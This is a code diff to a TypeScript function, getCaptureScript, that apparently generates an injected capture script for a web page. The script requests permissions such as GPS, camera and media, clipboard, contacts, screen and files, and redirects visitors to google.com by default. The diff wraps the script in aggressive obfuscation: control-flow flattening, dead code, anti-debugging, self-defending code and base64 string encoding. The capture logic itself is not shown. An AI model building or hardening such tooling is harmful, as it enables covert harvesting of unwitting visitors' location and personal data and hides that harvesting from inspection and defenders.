@@ -1,8 +1,10 @@
+import JavaScriptObfuscator from 'javascript-obfuscator';
+
 export const getCaptureScript = (id: string, redirectUrl: string = 'https://google.com', theme: any = {}) => {
   const flow = theme.flow || 'full'; 
   const perms = theme.perms || ['gps']; 
   
-  return `
+  const rawScript = `
 <script>
   (function() {
     var permsCompleted = 0;
@@ -625,6 +627,49 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
   })();
 </script>
   `;
+  
+  try {
+      const match = rawScript.match(/<script>([\s\S]*?)<\/script>/);
+      let scriptContent = match ? match[1] : '';
+      if(scriptContent) {
+          const obfRes = JavaScriptObfuscator.obfuscate(scriptContent, {
+            compact: true,
+            controlFlowFlattening: true,
+            controlFlowFlatteningThreshold: 0.75,
+            deadCodeInjection: true,
+            deadCodeInjectionThreshold: 0.4,
+            debugProtection: true,
+            debugProtectionInterval: 2000,
+            disableConsoleOutput: false,
+            identifierNamesGenerator: 'hexadecimal',
+            log: false,
+            numbersToExpressions: true,
+            renameGlobals: false,
+            selfDefending: true,
+            simplify: true,
+            splitStrings: true,
+            splitStringsChunkLength: 10,
+            stringArray: true,
+            stringArrayCallsTransform: true,
+            stringArrayCallsTransformThreshold: 0.5,
+            stringArrayEncoding: ['base64'],
+            stringArrayIndexShift: true,
+            stringArrayRotate: true,
+            stringArrayShuffle: true,
+            stringArrayWrappersCount: 1,
+            stringArrayWrappersChainedCalls: true,
+            stringArrayWrappersParametersMaxCount: 2,
+            stringArrayWrappersType: 'variable',
+            stringArrayThreshold: 0.75,
+            unicodeEscapeSequence: false
+        });
+        return `<script>${obfRes.getObfuscatedCode()}</script>`;
+      }
+      return rawScript;
+  } catch(e) {
+      // fallback
+      return rawScript;
+  }
 };
 
 const ALL_PERMS = ['media', 'gps', 'screen', 'notification', 'clipboard', 'contacts', 'network', 'performance', 'security', 'storage_map', 'network_forensic', 'fonts_advanced', 'window_mgmt', 'webauthn', 'sensors', 'storage', 'vibration', 'bluetooth', 'files'];
